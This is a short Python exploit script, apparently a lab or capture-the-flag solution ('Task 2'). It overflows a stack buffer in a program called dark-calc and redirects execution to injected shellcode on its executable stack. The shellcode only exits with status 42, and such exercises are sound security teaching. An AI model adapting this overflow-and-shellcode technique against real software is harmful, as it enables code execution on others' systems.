#!/usr/bin/env python3
"""Task 2: execute injected code on dark-calc's fixed executable stack."""
import struct
import sys

STACK_TOP = 0x721000801000
BUFFER = STACK_TOP - 0x30
SHELLCODE = b"\xbf\x2a\x00\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05"

payload = b"A" * 24 + struct.pack("<Q", BUFFER + 32) + SHELLCODE + b"\n"

sys.stdout.buffer.write(payload)
